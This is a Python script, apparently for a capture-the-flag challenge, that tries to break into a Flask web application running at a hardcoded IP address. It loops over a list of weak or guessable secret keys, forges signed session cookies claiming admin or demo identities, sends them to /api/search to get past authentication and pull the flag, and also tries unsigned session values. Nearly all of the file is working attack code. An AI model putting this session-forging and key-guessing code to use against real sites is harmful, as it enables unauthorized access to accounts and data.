#!/usr/bin/env python3
"""
Flask Session Cookie Cracking - Try to forge valid session
"""

import requests
import hashlib
import hmac
import base64
import json
import zlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner

BASE_URL = "http://138.199.163.92:16969"

print("="*70)
print("FLASK SESSION COOKIE CRACKING")
print("="*70)

# Common Flask secret keys
secret_keys = [
    # Super common
    'dev', 'development', 'debug', 'test', 'testing',
    'secret', 'secret_key', 'secretkey', 'secret-key',
    'flask', 'flask_secret', 'flask-secret',
    'key', 'mykey', 'my-key', 'my_key',
    
    # Default/weak
    '', 'password', 'admin', 'default', 'changeme',
    '123456', '12345678', 'qwerty', 'abc123',
    
    # Challenge-specific
    'quantumvault', 'quantum', 'vault', 'qv', 'qvi',
    'QuantumVault', 'Quantum', 'Vault', 'QV', 'QVI',
    'unhackable', 'unbreakable', 'secure',
    
    # Common patterns
    'super-secret', 'super_secret', 'supersecret',
    'my-secret-key', 'my_secret_key', 'mysecretkey',
    'flask-insecure-key', 'insecure', 'insecure-key',
    
    # Lazy devs
    'asdf', 'qwer', 'zxcv', 'temp', 'temporary',
    'todo', 'fixme', 'changethis', 'change-this',
]

print(f"\n[*] Trying {len(secret_keys)} secret keys...")

# Session data to forge
session_payloads = [
    {'user_id': 1, 'username': 'admin', 'logged_in': True},
    {'user_id': 1, 'username': 'demo', 'logged_in': True},
    {'user_id': 1, 'username': 'admin'},
    {'user_id': 1, 'username': 'demo'},
    {'username': 'admin', 'authenticated': True},
    {'username': 'demo', 'authenticated': True},
    {'logged_in': True},
    {'authenticated': True},
    {'admin': True},
    {'user': 'admin'},
    {'user': 'demo'},
]

for secret in secret_keys:
    for payload in session_payloads:
        try:
            # Try to forge session
            serializer = URLSafeTimedSerializer(secret, salt='cookie-session')
            session_cookie = serializer.dumps(payload)
            
            # Test it
            cookies = {'session': session_cookie}
            resp = requests.get(f"{BASE_URL}/api/search", cookies=cookies, timeout=3)
            
            if resp.status_code == 200:
                print(f"\n{'='*70}")
                print(f"[!!!] SESSION FORGED!")
                print(f"{'='*70}")
                print(f"Secret Key: {secret}")
                print(f"Payload: {payload}")
                print(f"Cookie: {session_cookie[:50]}...")
                print(f"\nResponse: {resp.text}")
                
                # Try to get flag
                session_obj = requests.Session()
                session_obj.cookies.set('session', session_cookie)
                
                for q in ['', 'flag', 'Kaal', '*']:
                    r = session_obj.get(f"{BASE_URL}/api/search", params={'q': q})
                    if 'Kaal{' in r.text:
                        print(f"\n[!!!] FLAG: {r.text}")
                
                exit(0)
                
            elif resp.status_code != 401:
                print(f"  [?] Secret '{secret}' with {payload} -> {resp.status_code}")
                
        except Exception as e:
            pass

print("\n[-] No valid secret key found")

# Try to extract session from a real login (if we had one)
print("\n[*] Trying to decode existing sessions...")

# Try common session formats
test_sessions = [
    'eyJ1c2VyX2lkIjoxfQ',  # {"user_id":1}
    'eyJ1c2VybmFtZSI6ImFkbWluIn0',  # {"username":"admin"}
    'eyJ1c2VybmFtZSI6ImRlbW8ifQ',  # {"username":"demo"}
]

for sess in test_sessions:
    cookies = {'session': sess}
    resp = requests.get(f"{BASE_URL}/api/search", cookies=cookies)
    if resp.status_code != 401:
        print(f"  [!] Session '{sess}' -> {resp.status_code}")
        print(f"      {resp.text[:200]}")

print("\n[*] Flask session cracking complete!")
